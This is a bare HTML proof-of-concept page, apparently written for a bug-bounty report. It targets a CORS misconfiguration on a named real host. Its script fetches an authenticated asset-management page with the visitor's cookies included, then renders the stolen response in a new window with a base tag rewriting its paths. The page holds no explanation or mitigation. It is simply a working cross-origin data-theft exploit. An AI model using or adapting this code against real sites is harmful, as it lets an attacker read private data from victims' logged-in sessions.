<!DOCTYPE html>
<html>
<head>
  <title>CORS Page Viewer</title>
</head>
<body>
  <h2>Load CORS content from intigriti.ilias-solutions.com</h2>
  <button onclick="loadPage()">Load Page</button>
  <iframe id="corsFrame" width="100%" height="600px"></iframe>

  <script>
    function loadPage() {
      fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
        credentials: "include"
      })
        .then(r => r.text())
        .then(html => {
          // Patch relative paths to load from the real domain
          const patchedHtml = html.replace(
            /<head>/i,
            `<head><base href="https://intigriti.ilias-solutions.com/intigriti/assmgmt/">`
          );
          const win = window.open();
          win.document.write(patchedHtml);
          win.document.close();
        });
    }
  </script>
</body>
</html>
